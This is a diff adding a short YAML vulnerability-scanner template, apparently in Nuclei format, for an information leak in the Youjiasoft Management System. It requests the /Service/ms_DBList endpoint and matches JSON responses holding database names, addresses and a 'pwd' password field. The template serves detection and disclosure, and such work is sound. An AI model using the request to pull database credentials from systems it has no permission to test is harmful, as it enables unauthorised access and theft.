@@ -1,0 +1,32 @@
+id: youjiasoft-ms-dblist-info-leak
+info:
+  name: Youjiasoft Management System ms_DBList Information Leak Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Service/ms_DBList?a=789234"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"DBName\\\":"
+          - "\"address\\\":"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: regex
+        regex:
+          - "\"pwd\\\":\\\"([A-Za-z0-9!@#$%^&*()_+\\-=\\[\\]{};':\\\"\\|,.<>\\/?~]+)\""
